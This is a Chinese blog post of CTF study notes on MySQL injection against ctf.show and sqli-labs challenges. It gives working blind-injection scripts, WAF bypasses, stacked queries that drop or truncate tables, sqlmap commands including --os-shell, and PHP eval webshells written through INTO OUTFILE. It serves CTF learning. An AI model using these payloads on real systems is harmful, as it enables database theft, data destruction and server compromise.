---
title: interesting4
date: 2023-08-02 21:35:42
categories:
- 网络安全
tags:
- web 
description: |
    sql注入
---
### mysql

information_schema->columns,tables,schemata
注释:

- `--%20`
- `#`
列出所有数据库
`show databases`
查看某个数据库中的表

```js
use mysql;
show tables;
\\\\\\\\\\\\\\\\\\\\\
show tables from mysql;
```

select

```php
#查看当前选择是哪个库
select database();
#版本
select version();
#查看当前登陆数据库的用户
select user();
#查看数据路径
select @@datadir;
#查看mysql安装路径
select @@basedir;
#查看mysql安装的系统
select @@version_compile_os;

```

```php
#查询数据 *-> any
select * from mysql.user;
select schema_name form information_schema.'schemata'->show databases;
select * from information_schema.tables;
where->if
select * from mysql.user where user = 'root';

```

union

```php
#测试字段数
select * from mysql.user union select 1,2; (1,2,3,4,5……)
 
```

`group_concat()`将查询的字段数合并一起输出

### 一次简单的注入

查询语句：`$sql = "select username,password from user where username !='flag' and id = '".$_GET['id']."' limit 1;";`
正常查询：`select username,password from user where username !='flag' and id ='1' limit 1;`
注入查询：

- 加个单引号`select username,password from user where username !='flag' and id ='1'' limit 1;`  报错
- 加注释 `1' --+`
- order by测试列`1' order by 4 --+` 报错，列数不够递减直到正常
- union查询 union语句来连接查询，并且在前面把id改成-1以达到把查询id回显的数据给置空的目的
`-1 union select database(),2,3 --+` 查询到数据库名字
`-1' union select group_concat(table_name),2,3 from information_schema.tables where table_schema="ctfshow_web" --+` 查询到表名
`-1' union select group_concat(column_name),2,3 from information_schema.columns where table_name="ctfshow_user"--+` 查询到列名
`-1' union select password,2,3 from ctfshow_user--+` 查询到flag
`from ctfshow_user4`
`from ctfshow_web.ctfshow_user4 --+`

### 盲注

#### 布尔盲注

```python
#! -*- encoding:utf-8 -*-
import requests
#用这里的语句分别替换id中的内容即可爆库、表、字段
#select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA
#select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA = 'xxx'
#select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA = 'xxx' and TABLE_NAME = 'xxx'
dic='0123456789abcdefghijklmnopqrstuvwxyz,'
url='http://127.0.0.1/sqli-labs/Less-8/?id=1\' and '
string=''
for i in range(1,100):
    for j in dic:
        id="substr((select group_concat(schema_name) from information_schema.schemata limit 0,1),{0},1)={1}--+".format(str(i),ascii(j))
        #print(id)
        url_get=(url+id)
        #print(url_get)
        r=requests.get(url_get)
        if "admin" in r.text:
            string+=j
            print(string)
print(string)
```

#### 时间盲注

web 214 217 有详细脚本

```python
import requests
#用这里的语句分别替换id中的内容即可爆库、表、字段
#select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA
#select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA = 'xxx'
#select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA = 'xxx' and TABLE_NAME = 'xxx'
dic='0123456789abcdefghijklmnopqrstuvwxyz,'
url='http://127.0.0.1/sqli-labs/Less-8/?id=1\' and '
string=''
for i in range(100):
    for j in dic:
        id="if((substr((select group_concat(schema_name) from information_schema.schemata limit 0,1),{0},1)={1}),sleep(3),0)--+".format(str(i),ascii(j))
        #print(id)
        url_get=(url+id)
        #print(url_get)
        r=requests.get(url_get)
        sec=r.elapsed.seconds
        if sec > 2:
            string+=j
            print(string)
            break
print(string)
```

#### like盲注

```python
import requests

url = "http://adb1f64a-e1fd-4640-aeb5-b49da1a62390.challenge.ctf.show:8080/select-waf.php"
str = "0123456789abcdefghijklmnopqrstuvwxyz{}-"
flag = "ctfshow"
for i in range(0,666):
    for j in str:
        data = {"tableName":"(ctfshow_user)where(pass)like'{0}%'".format(flag+j)}
        res = requests.post(url=url, data=data)
        if "$user_count = 1" in res.text:
            flag += j
            print(flag)
            if j=="}":
                exit()
            break

```

#### regexp盲注

```python
import requests
import string

url = 'http://e62dd2da-6dc5-4d4c-8907-ab198e411f30.challenge.ctf.show/select-waf.php'
uuid = string.digits+string.ascii_lowercase+"-}"
passwd = 'ctfshow_user group by pass having pass regexp(0x63746673686f777b' #ctfshow{

for i in range(40):
    for char in uuid:
        data = {
            'tableName' : passwd +f"{hex(ord(char))[2:]})"
        }
        res = requests.post(url, data=data)
        if "$user_count = 1;" in res.text:
            passwd += hex(ord(char))[2:]
            print(passwd)
            break

```

#### load_file盲注

`LOAD_FILE(file_name)`： 读取文件并返回文件内容为字符串。要使用此函数，文件必须位于服务器主机上，必须指定完整路径的文件，而且必须有FILE权限。

```python
import requests
url = "http://e232d7fb-b70d-4123-a740-369d7137c5dd.challenge.ctf.show:8080/api/index.php"
all_str = "0123456789abcdefghijklmnopqrstuvwxyz-{}"
flag = "ctfshow{"

for i in range(200):
    for j in all_str:
        data = {
            "username":"if(load_file('/var/www/html/api/index.php')regexp('{0}'),0,1)".format(flag + j),
            'password':0
        }
        res = requests.post(url=url, data=data)
        if r"\u5bc6\u7801\u9519\u8bef" in res.text:
            flag +=j
            print(flag)
            break
        if j=='}':
            exit()
```

#### trim盲注

```python
import requests
import string

url="http://b1c54244-c67c-41e9-80af-c6c916ee3cf2.challenge.ctf.show/api/v4.php?id=1'"

uuid=string.ascii_lowercase+"-}{"+string.digits
flag="ctfshow{"

for i in range(1,46):
    for j in uuid:
        payload = f"and trim(leading '{flag}{j}' from (select group_concat(password) from ctfshow_user4 where username = 'flag'))=trim(leading '{flag}.' from (select group_concat(password) from ctfshow_user4 where username = 'flag'))--%20".replace(" ", "/**/")
        res = requests.get(url+payload)
        print(j)
        if "admin" not in res.text:
            flag += j
            print("flag=",flag)
            break
        else:
            pass
```

### join

RIGHT JOIN 会读取右边数据表的全部数据，即使左边边表无对应数据
MySQL LEFT JOIN 会读取左边数据表的全部数据，即使右边表无对应数据
INNER JOIN(也可以省略 INNER 使用 JOIN，效果一样)来连接以上两张表来读取a表中所有x字段在b表对应的y字段值

### WAF绕过

#### 过滤等号

```sql
> 
<
between a and b
in
like
rlike
regexp
and
or
case
xor
````

#### 大小写绕过

直接大小写绕过 没什么好说的

#### 空格绕过

`%09 %0a %0b %0c %0d %a0 /**/ ()`

直接查

```bash
id='-1'or(id=26)and'1' limit 1;
也就是
(id='-1') or ((id=26) and '1') limit 1;
前面为0，后面为1，所以整个条件为1
```

#### 过滤注释

`%00`
异或

```sql
select 1^1^1; # 1
select 1^0^1; # 0
select 1^(ascii('a') - 96)^1; # 1
select 1^(ascii('a') - 97)^1; # 0
-- 过滤注释
select * where id = '1'^(ascii('a') - 97)^'1' # 1
select * where id = '1'^(ascii('a') - 96)^'1' # 0
```

```sql
1' and '1'='1
1' and 1-(ascii('a')-97)-'1
```

#### 过滤where

- group by id having id regexp(0x....)
- right join on

```bash
ctfshow_user as a right join ctfshow_user as b on b.pass like 0x63746673686f7725 #ctfshow%    16进制编码后-->   0x63746673686f7725
```

#### 过滤回显

##### 编码绕过

如`$row->username!=='flag'`

用base64编码或者hex编码绕过
`-1' union select to_base64(username),hex(password) from ctfshow_user2 --+`

##### 查询结果写入文件

直接查询
`1' union select username , password from ctfshow_user4 where username='flag' into outfile'/var/www/html/ctf.txt' --+`
webshell
`?id=' UNION ALL SELECT 1,2,'<?php echo 123;eval($_POST[0]);?>',3 into outfile '/var/www/html/1.php' %23`

##### 替换字符

`-1' union select replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(username),'1','numA'),'2','numB'),'3','numC'),'4','numD'),'5','numE'),'6','numF'),'7','numG'),'8','numH'),'9','numI'),'0','numJ'),replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(password),'1','numA'),'2','numB'),'3','numC'),'4','numD'),'5','numE'),'6','numF'),'7','numG'),'8','numH'),'9','numI'),'0','numJ') from ctfshow_user4 where username='flag' --+`

#### 过滤数字

| Expression                 | Value |
| -------------------------- | ----- |
| false                      | 0     |
| true                       | 1     |
| true+true                  | 2     |
| floor(pi())                | 3     |
| ceil(pi())                 | 4     |
| floor(pi())+true           | 5     |
| floor(pi())+floor(pi())    | 6     |
| floor(pi())+ceil(pi())     | 7     |
| ceil(pi())+ceil(pi())      | 8     |
| floor(pi())*floor(pi())    | 9     |
| floor(pi())*floor(pi())+true | 10    |

#### 过滤ascii

替换成`ord`函数：返回字符串的第一个字符的ascii值

#### 过滤substr

-`trim`函数：去除字符串首尾的空格或其他字符

-`^`匹配字符的开头  正则表达式'^abc'将会匹配任何以'abc'开始的行或字符串。例如，它会匹配'abcdef'，但不会匹配'abcdefabc'的第二个'abc'，因为那个'abc'并不在行或字符串的开头

-`right`
从右边开始截取,配合ascii使用.
ascii('str')返回字符串的第一个字符的ascii码
`ascii(right('abc',2))= 97`相当于 `ascii('bc')=97`

- `left`
从左边开始截取,用`reverse`反转
`ascii(reverse(left('abc',2))) = 97`相当于 `ascii('bc')=97`

`mid`
mid和substr效果一样,代码同上

#### 过滤information_schema

可以考虑mysql或者sys
`mysql.innodb_table_stats`
`mysql.innodb_index_stats`
`sys.schema_auto_increment_columns`
`sys.schema_table_statistics_with_buffer`
`sys.schema_table_statistics`

#### 过滤sleep

benchmark(10000000,md5(1))  用来延时
笛卡尔积
get_lock()
regexp rlike

### 万能密码

`md5($password,true)`

```bash
ffifdyop
129581926211651571912466741651878684928
```

### mysql弱比较

```php
 $sql = "select pass from ctfshow_user where username = {$username}";

//密码判断
  if($row['pass']==intval($password)){
      $ret['msg']='登陆成功';
      array_push($ret['data'], array('flag'=>$flag));
    }
```

以字母开头的数据在和数字比较时，会被强制转换为0
如果有某个数据不是以字母开头，是匹配不成功的，这种情况可以用||运算符
`username=1||1&password=0`

### 堆叠注入

#### update改密码

``0x61646d696e;update`ctfshow_user`set`pass`=123456``

#### emmm

```php
if($row[0]==$password){
    $ret['msg']="登陆成功 flag is $flag";
}

username：520;select(1)
password：1
```

这样操作`$row[0]`就是1，就可以绕过了

#### insert

`insert  ctfshow_user(`username`,`pass`) value(0,0);`直接插入一条数据

#### alter

```python
import requests

url = "http://e36a9275-a8a8-4def-bce5-0988a2b9b81d.challenge.ctf.show:8080/api/"
payload = '0x61646d696e;alter table ctfshow_user change column `pass` `dionysus` varchar(255);alter table ctfshow_user change column `id` `pass` varchar(255);alter table ctfshow_user change column `dionysus` `id` varchar(255);'
data1 = {
    'username': payload,
    'password': '1'
}
res = requests.post(url=url, data=data1)

for i in range(99):
    data2 = {
        'username': "0x61646d696e",
        'password': f'{i}'
    }
    res2 = requests.post(url=url, data=data2)
    if "flag" in res2.json()['msg']:
        print(res2.json()['msg'])
        break
```

把id和password互换再爆破

#### handler

handler 解法
payload1: `ctfshow';show tables%23`

`{"code":0,"msg":"\u67e5\u8be2\u6210\u529f","count":1,"data":[{"id":"1","username":"ctfshow","pass":"ctfshow"},{"Tables_in_ctfshow_web":"ctfshow_flagasa"},{"Tables_in_ctfshow_web":"ctfshow_user"}]}`

payload2: `ctfshow';handler ctfshow_flagasa open as t;handler t read first;handler t close%23`

登录后复制
`{"code":0,"msg":"\u67e5\u8be2\u6210\u529f","count":1,"data":[{"id":"1","username":"ctfshow","pass":"ctfshow"},{"id":"1","flagas":"ctfshow{83599e7a-ba35-4ce6-88a1-6e1c69755ccb}","info":"you get it"}]}`

#### 预处理

预处理解法
concat 和 char 都可以绕过过滤。

```python
def make_payload(sql: str) -> str:
    return f"ctfshow';prepare n from char({','.join(str(ord(c)) for c in sql)});execute n%23"
```

也可以concat``Prepare stmt from CONCAT('se','lect * from `ctfshow_flagasa`;');EXECUTE stmt;``

这是char：
payload1: `make_payload("show tables;")`

`{"code":0,"msg":"\u67e5\u8be2\u6210\u529f","count":1,"data":[{"id":"1","username":"ctfshow","pass":"ctfshow"},{"Tables_in_ctfshow_web":"ctfshow_flagasa"},{"Tables_in_ctfshow_web":"ctfshow_user"}]}`

payload2: `make_payload("select * from ctfshow_flagasa;")`

`{"code":0,"msg":"\u67e5\u8be2\u6210\u529f","count":1,"data":[{"id":"1","username":"ctfshow","pass":"ctfshow"},{"id":"1","flagas":"ctfshow{83599e7a-ba35-4ce6-88a1-6e1c69755ccb}","info":"you get it"}]}`

concat 或 char 函数可以用 0x 代替

```python
def make_payload(sql: str) -> str:
    return f"user1';prepare n from 0x{sql.encode().hex()};execute n%23"
```

other:

```bash
'abc' 等价于unhex(hex(6e6+382179)); 可以用于绕过大数过滤（大数过滤：/\d{9}|0x[0-9a-f]{9}/i）
具体转换的步骤是：
  1. abc转成16进制是616263
  2. 616263转十进制是6382179
  3. 用科学计数法表示6e6+382179 
  4. 套上unhex(hex())，就是unhex(hex(6e6+382179));
```

#### mysql存储过程

[原理](https://blog.csdn.net/qq_41573234/article/details/80411079)

  information_schema  数据库中的  Routines  表中，存储了所有存储过程和函数的定义。使用 SELECT 语句查询  Routines 表中的存储过程和函数的定义时，一定要使用 ROUTNE_NAME  字段指定存储过程或函数的名称。否则，将查询出所有的存储过程或函数的定义。如果存储过程和存储函数名称相同，则需要要同时指定  ROUTINE_TYPE  字段表明查询的是哪种类型的存储程序。

`SELECT   *   FROM   information_schema.Routines WHERE   ROUTINE_NAME  =  '   sp_name  ' ;`
其中，`ROUTINE_NAME`  字段中存储的是存储过程和函数的名称;  `sp_name`  参数表示存储过程或函数的名称。

#### drop create/truncate insert

`1;drop table ctfshow_user;create table ctfshow_user(username varchar(255),pass varchar(255));insert ctfshow_user values(1,1)`
`drop table ctfshow_user;`这条命令会删除（或者说，"丢弃"）名为` ctfshow_user `的数据库表。这将会移除表以及表中的所有数据。

`create table ctfshow_user(username varchar(255),pass varchar(255));`这条命令会创建一个新的表 `ctfshow_user`，并且为其定义了两个列` username `和` pass `。这两个列的数据类型都是` varchar(255) `，也就是最长为255字符的变长字符串

`insert`操作可以不加`into`

TRUNCATE语句只删除表中的所有数据，而不删除表本身。所以你不需要再用CREATE语句重新创建表
`truncate` ：`1;TRUNCATE TABLE ctfshow_user;INSERT INTO ctfshow_user(username, pass) VALUES (1,1);`

### sqlmap

```bash
#POST 需要 --data 'a=1&b=2' --dbs
1.sqlmap -u "目标网址/?id=1" --dbs
2.sqlmap -u "目标网址" -D [数据库名] --tables
3.sqlmap -u "目标网址" -D [数据库名] -T [表名] --columns
4.sqlmap -u "目标网址" -D [数据库名] -T [表名] -C [列名] --dump
#
```

报错注入: `sqlmap -u [目标url] --current-db --batch --threads 10 --technique E`
布尔盲注: `sqlmap -u [目标url] --current-db --batch --threads 10 --technique B`
时间盲注: `sqlmap -u [目标url] --current-db --batch --threads 10 --technique T -v 3`

！POST注入（*标识哪里 就对哪里进行打击）
`sqlmap -u "目标url" --data "uname=admin*&passwd=admin&submit=Submit" --dbs --batch --threads 10 --technique E`

SQLmap实现Http-header头注入之
1.User-Agent注入 ：
在使用请求头注入的时候，--level必须大于3

`sqlmap -u [目标url] --user-agent="抓包得到的对应的内容*" --level 4 --dbs --threads 10 --batch --technique E`

2.Cookie注入 ：
`sqlmap -u [目标url] --cookie="原来*的cookie内容" --level 4 --dbs --threads 10 --batch --technique E`

api调用需要鉴权
`--safe-url` 设置在测试目标地址前访问的安全链接
`--safe-freq` 设置两次注入测试前访问安全链接的次数
`--safe-url http://6875a9a6-d8df-40be-8ba4-c97268e5952f.challenge.ctf.show/api/getToken.php --safe-freq 1`

一些补充
`--technique B` 布尔盲注
`--technique E` 报错注入
`--technique U` union查询注入
`--technique S` 堆叠注入
`--technique T` 时间盲注
`--technique Q` 内联查询注入

脚本绕过限制
eg：`sqlmap -u "目标网址" -D [数据库名] -T [表名] -C [列名] --dump --tamper space2comment.py`

本机脚本存放位置：`/opt/homebrew/Cellar/sqlmap/1.7.6/libexec/tamper/`
举例如下tamper脚本：

```bash
apostrophemask.py 用utf8代替引号
equaltolike.py MSSQL * SQLite中like 代替等号
greatest.py MySQL中绕过过滤’>’ ,用GREATEST替换大于号
space2hash.py 空格替换为#号 随机字符串 以及换行符
space2comment.py 用/**/代替空格
apostrophenullencode.py MySQL 4, 5.0 and 5.5，Oracle 10g，PostgreSQL绕过过滤双引号，替换字符和双引号
halfversionedmorekeywords.py 当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论
space2morehash.py MySQL中空格替换为 #号 以及更多随机字符串 换行符
appendnullbyte.p Microsoft Access在有效负荷结束位置加载零字节字符编码
ifnull2ifisnull.py MySQL，SQLite (possibly)，SAP MaxDB绕过对 IFNULL 过滤
space2mssqlblank.py mssql空格替换为其它空符号
base64encode.py 用base64编码
space2mssqlhash.py mssql查询中替换空格
modsecurityversioned.py mysql中过滤空格，包含完整的查询版本注释
space2mysqlblank.py mysql中空格替换其它空白符号
between.py MS SQL 2005，MySQL 4, 5.0 and 5.5 * Oracle 10g * PostgreSQL 8.3, 8.4, 9.0中用between替换大于号（>）
space2mysqldash.py MySQL，MSSQL替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）
multiplespaces.py 围绕SQL关键字添加多个空格
space2plus.py 用+替换空格
bluecoat.py MySQL 5.1, SGOS代替空格字符后与一个有效的随机空白字符的SQL语句。 然后替换=为like
nonrecursivereplacement.py 双重查询语句。取代predefined SQL关键字with表示 suitable for替代
space2randomblank.py 代替空格字符（“”）从一个随机的空白字符可选字符的有效集
sp_password.py 追加sp_password’从DBMS日志的自动模糊处理的26 有效载荷的末尾
chardoubleencode.py 双url编码(不处理以编码的)
unionalltounion.py 替换UNION ALL SELECT UNION SELECT
charencode.py Microsoft SQL Server 2005，MySQL 4, 5.0 and 5.5，Oracle 10g，PostgreSQL 8.3, 8.4, 9.0url编码；
randomcase.py Microsoft SQL Server 2005，MySQL 4, 5.0 and 5.5，Oracle 10g，PostgreSQL 8.3, 8.4, 9.0中随机大小写
unmagicquotes.py 宽字符绕过 GPC addslashes
randomcomments.py 用/**/分割sql关键字
charunicodeencode.py ASP，ASP.NET中字符串 unicode 编码
securesphere.py 追加特制的字符串
versionedmorekeywords.py MySQL >= 5.1.13注释绕过
halfversionedmorekeywords.py MySQL < 5.1中关键字前加注释
```

`–os-shell`
`–os-shell` 其本质是写入两个shell文件，其中一个可以命令执行，另一个则是可以让我们上传文件；
不过也是有限制的，上传文件我们需要受到两个条件的限制，一个是网站的绝对路径，另一个则是导入导出的权限

在mysql中，由` secure_file_priv `参数来控制导入导出权限，该参数后面为null时，则表示不允许导入导出；如果是一个文件夹，则表示仅能在这个文件夹中导入导出；如果参数后面为空，也就是没有值时，则表示在任何文件夹都能导入导出

sqlmap两个文件，一个是`tmpbsyns.php`，另一个是`tmpurinp.php`，其中`tmpbsyns.php`是用来执行命令的，`tmpurinp.php`则是用来上传文件的
`tmpbsyns.php`
`tmpurinp.php`

最后附上一个sqlmap例子
`sqlmap -u http://b33260ff-e59f-43b3-a76a-b0abe8dbf074.challenge.ctf.show/api/index.php  --method=PUT --headers="Content-Type: text/plain" --data="id=1" --refer=ctf.show  -D ctfshow_web -T ctfshow_flavis -C ctfshow_flagxsa --dump --safe-url http://b33260ff-e59f-43b3-a76a-b0abe8dbf074.challenge.ctf.show/api/getToken.php --safe-freq 1 --tamper="revbaserev.py "`

### limit注入

此方法适用于MySQL 5.x中，在limit语句后面的注入
`SELECT field FROM user WHERE id >0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);`
`ERROR 1105 (HY000): XPATH syntax error: ':5.5.41-0ubuntu0.14.04.1'`
如果不支持报错注入的话，还可以基于时间注入：

`SELECT field FROM table WHERE id > 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)`

### group by

#### 报错注入

使用`ceil()`(向上取整)代替`floor()`。当然也可以使用`round()`

`select count(*) from information_schema.tables group by concat(database(),floor(rand(0)*2));`

`floor(rand(0)*2)`产生的随机数前6位一定是`0 1 1 0 1 1`
`concat()`用于将字符串连接
`concat(database(),floor(rand(0)*2))`生成`database()+"0"`或`database()+"1"`的数列，而前六位的顺序一定是
`database()+"0"`
`database()+"1"`
`database()+"1"`
`database()+"0"`
`database()+"1"`
`database()+"1"`
报错具体过程：

建立临时表
取第一条记录，执行`concat(database(),floor(rand(0)*2))（第一次执行），结果为database()+“0”`，查询临时表，发现`database()+"0"`这个主键不存在，则准备执行插入，此时又会在执行一次`concat(database(),floor(rand(0)*2))`（第二次执行），结果是`database()+“1”`，然后将该值作为主键插入到临时表。*（真正插入到临时表中的主键是`database()+“1”，concat(database(),floor(rand(0)2))` 执行了两次）
取第二条记录，执行`concat(database(),floor(rand(0)2))`（第三次执行），结果为`database+“1”`，查询临时表，发现该主键存在，count()的值加1
取第三条记录，执行`concat(database(),floor(rand(0)*2))`（第四次执行），结果为`database()+“0”`，查询临时表发现该主键不存在，则准备执行插入动作，此时又会在执行一次`concat(database(),floor(rand(0)*2))`（第五次执行），结果是`database()+“1”`，然后将该值作为主键插入到临时表。但由于临时表已经存在`database()+"1"`这个主键，就会爆出主键重复，同时也带出了数据库名，这就是`group by`报错注入的原理

#### 基于时间的盲注

web222
查询语句
//分页查询
`$sql = select * from ctfshow_user group by $username;`
每则数据都需要group by归类，所以都会执行sleep语句，那么有几条数据就会执行几次sleep

利用
`select * from ctshow_user group by 1,if(1=1,sleep(0.05),1)`

### 奇怪的上传 finfo&exif文件信息注入

魔术字节
在`~/ctf/payload.bin`

首先肯定是有数据库存储相关文件信息（上图中的filetype），因此查询一下PHP有哪些函数或者方法会有这样的功能，查询PHP官方手册后可以发现，其中finfo对象以及finfo_file函数是有这个功能的
因此就可以大胆猜测在filetype会存在SQL注入，并且SQL语句应该是insert开头的插入语句

那么如何控制这个filetype呢？

我们可以使用file命令查看一个文件的信息
这一个命令一出是不是就发现和上面那个页面的filetype十分相似了呢？

那么是否有工具可以控制这个filetype呢？有的，那就是exiftool

`insert into columns('字段1'，'字段2'，'字段3') value('值1'，'值2'，'值3')`
因此注入语句

`123"';select if(1,sleep(5),sleep(5));--+`
具体的exiftool的命令为
`exiftool -overwrite_original -comment="123\"');select if(1,sleep(5),sleep(5));--+" avatar.jpg`
利用exiftool添加comment之后，使用file命令查看文件信息
可以看到，命令已经成功注入到了comment中，上传该图片，就可以发现明显有延迟，所以命令注入成功。
之后拿flag就很简单了，利用into outfile写入一句话木马即可，这里就不赘述了。

### update注入

```php
//分页查询
$sql = "update ctfshow_user set pass = '{$password}' where username = '{$username}';";
      
//无过滤
```

update 注入，可以布尔盲注，但更方便的是注入 password 处逗号分隔用要查的数据改掉 username ，注释掉后面的条件可覆盖所有的记录，再查询数据实现回显。
`payload1: password=ctfshow',username=(select group_concat(table_name) from information_schema.tables where table_schema=database())%23&username=nonono`
`username: banlist,ctfshow_user,flaga`
`payload2: password=ctfshow',username=(select group_concat(column_name) from information_schema.columns where table_name='flaga')%23&username=nonono`
`username: id,flagas,info`
`payload3: password=ctfshow',username=(select flagas from flaga)%23&username=nonono`
username 找到 flag。

一个有趣的事：
如果引号闭合 没有过滤`\` 那么可以使第一个参数后的引号转义 这样就可以注入了。

```sql
update ctfshow_user set pass = '\' where username = ',username=database()#'
等价于
update ctfshow_user set pass = 'x',username=database()#'
```

查询语句`$sql = "update ctfshow_user set pass = '{$password}' where username = '{$username}';";`
eg:`password=\&username=,username=(select group_concat(flagass233) from flag233333)%23`

密码变成了`' where username =` `%23`注释掉了后面的`'`

### 无列名注入

#### 基于join的无列名注入的场景与方法

`select Host,User,Select_priv from user where User="root"`

在上述场景中用户可以控制的输入是字符串"root"，假设的攻击场景中我们可以突破双引号闭合并进行任意sql注入。但是我们无法获取到表的列名信息，只知道我们想要攻击的表的名字为"test"。

使用order by 猜解查询语句的查询的字段数
构造下述查询语句,通过修改其中的“1”部分为"1,2,3,...,n"，猜解"test"的列数。当列数猜解正确时，便成功提取了test表中的信息。
`select Host,User,Select_priv from user where User="root" and 0=1 union select * from (select 1 as a) as a join test as b limit 1;`

#### 基于union select的无列名注入（子查询）

对于下述语句，select只查询了一个字段，而我们的test表总共有两个字段。并且我们同样不知道test的列名。而join方法显然不能使union select左右两侧查询的列数相等。

`select 1,2,3,4,5 union select * from table;`猜列数
``select `2` from (select 1,2,3,4,5 union select * from table)a;``查询对应列
(`select c from (select 1,2 as b,3,4 as c,5 as d union select * from table)a;`如果过滤`\``)

我们需要通过修改其中的“1,2”部分为"1,2,3,...,n"，猜解"test"的列数，另外请注意反引号的使用

``0'/**/union/**/select/**/1,2,group_concat(`2`)/**/from/**/(select/**/2/**/union/**/(select/**/*/**/from/**/ctftraining.flag))a/**/;%00``

``1 union select *from  (select `2` from (select 1,2 union select* from test) as b) as c limit 1 offset 1;``

``password=%5C&username=,username=(select concat(`2`,0x2d,`3`) from (select 1,2,3 union select * from flaga)a limit 1,3)%23``

``password=%5C&username=,username=(select d from (select 1,2 as d,3 union select * from flag23a1)a)%23``

这些都是可以的

### insert注入

eg:

```php
  //插入数据
  $sql = "insert into ctfshow_user(username,pass) value('{$username}','{$password}');";
```

```sql
#获取表名
username=1',(select group_concat(table_name) from information_schema.tables where table_schema=database()))%23&password=1

#获取列名
username=1',(select group_concat(column_name) from information_schema.columns where table_name='flag'))%23&password=1

#获取数据
username=1',(select group_concat(flagass23s3) from flag))%23&password=1


username=\&password=,(select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name=database())))%23
username=\&password=,(select(flag)from(flagbb)))%23
```

### delete注入

```php
 //删除记录
  $sql = "delete from  ctfshow_user where id = {$id}";
```

后面加一个`sleep(1)` 就是时间盲注

具体见web241

### file模块

eg

```php
//备份表
$sql = "select * from ctfshow_user into outfile '/var/www/html/dump/{$filename}';";
      
//无过滤
```

```php
SELECT ... INTO OUTFILE 'file_name'
        [CHARACTER SET charset_name]
        [export_options]

export_options:
    [{FIELDS | COLUMNS}
        [TERMINATED BY 'string']//分隔符
        [[OPTIONALLY] ENCLOSED BY 'char']
        [ESCAPED BY 'char']
    ]
    [LINES
        [STARTING BY 'string']
        [TERMINATED BY 'string']
    ]
#可以利用 export_options 插 shell。

“OPTION”参数为可选参数选项，其可能的取值有：

`FIELDS TERMINATED BY '字符串'`：设置字符串为字段之间的分隔符，可以为单个或多个字符。默认值是“\t”。

`FIELDS ENCLOSED BY '字符'`：设置字符来括住字段的值，只能为单个字符。默认情况下不使用任何符号。

`FIELDS OPTIONALLY ENCLOSED BY '字符'`：设置字符来括住CHAR、VARCHAR和TEXT等字符型字段。默认情况下不使用任何符号。

`FIELDS ESCAPED BY '字符'`：设置转义字符，只能为单个字符。默认值为“\”。

`LINES STARTING BY '字符串'`：设置每行数据开头的字符，可以为单个或多个字符。默认情况下不使用任何字符。

`LINES TERMINATED BY '字符串'`：设置每行数据结尾的字符，可以为单个或多个字符。默认值是“\n”。

```

`FIELDS TERMINATED BY、 LINES STARTING BY、 LINES TERMINATED BY` 三个参数可以用来插入shell。
`filename=1.php' lines terminated by '<?php eval($_POST[1]); ?>'%23`

ini 文件中注释 `;` 开头

`filename=.user.ini' lines starting by ';' terminated by 0x0a6175746f5f70726570656e645f66696c653d312e6a70670a;#`
也就是如下语句，只不过在`auto_prepend_file=1.jpg`前后加了%0a用于换行，保证注入的内容单独在一行
`filename=.user.ini' lines starting by ';' terminated by "auto_prepend_file=1.jpg"#`

![结果](https://img.siren.blue/post_img/sqlfile.webp)

再上传图片马`filename=1.jpg' lines starting by '<?=eval($_POST[1]);?>'#`

### error注入

```php
1. floor + rand + group by
select * from user where id=1 and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a);
select * from user where id=1 and (select count(*) from (select 1 union select null union select  !1)x group by concat((select table_name from information_schema.tables  limit 1),floor(rand(0)*2)));

2. ExtractValue
select * from user where id=1 and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));

3. UpdateXml
select * from user where id=1 and 1=(updatexml(1,concat(0x3a,(select user())),1));

4. Name_Const(>5.0.12)
select * from (select NAME_CONST(version(),0),NAME_CONST(version(),0))x;

5. Join
select * from(select * from mysql.user a join mysql.user b)c;
select * from(select * from mysql.user a join mysql.user b using(Host))c;
select * from(select * from mysql.user a join mysql.user b using(Host,User))c;

6. exp()//mysql5.7貌似不能用
select * from user where id=1 and Exp(~(select * from (select version())a));

7. geometrycollection()//mysql5.7貌似不能用
select * from user where id=1 and geometrycollection((select * from(select * from(select user())a)b));

8. multipoint()//mysql5.7貌似不能用
select * from user where id=1 and multipoint((select * from(select * from(select user())a)b));

9. polygon()//mysql5.7貌似不能用
select * from user where id=1 and polygon((select * from(select * from(select user())a)b));

10. multipolygon()//mysql5.7貌似不能用
select * from user where id=1 and multipolygon((select * from(select * from(select user())a)b));

11. linestring()//mysql5.7貌似不能用
select * from user where id=1 and linestring((select * from(select * from(select user())a)b));

12. multilinestring()//mysql5.7貌似不能用
select * from user where id=1 and multilinestring((select * from(select * from(select user())a)b));
```

eg:`1' and updatexml(1,concat(0x7c,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1) %23`
`1' and updatexml(1,concat(0x7c,(select group_concat(column_name) from information_schema.columns where table_name='ctfshow_flagsa')),1) %23`
`1' and updatexml(1,concat(0x7c,(select flag1 from ctfshow_flagsa)),1) %23`
`1' and updatexml(1,concat(0x7c,mid((select flag from ctfshow_flag),30,30)),1) %23`

#### 双查询注入

（偷来的）

额，和floor报错注入有什么区别

### uaf注入

```php
$sql = "select id,username,pass from ctfshow_user where id = '".$id."' limit 1;";
//无过滤,

```

mysql的UAF注入,简单来说就是把dll文件写到目标机子的plugin目录，这个目录是可以通过select @@plugin_dir来得到的。

`CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.so'; //导入udf函数`

web248

### nosql

```php
$gt : >
$lt : <
$gte: >=
$lte: <=
$ne : !=、<>
$in : in
$nin: not in
$all: all 
$or:or
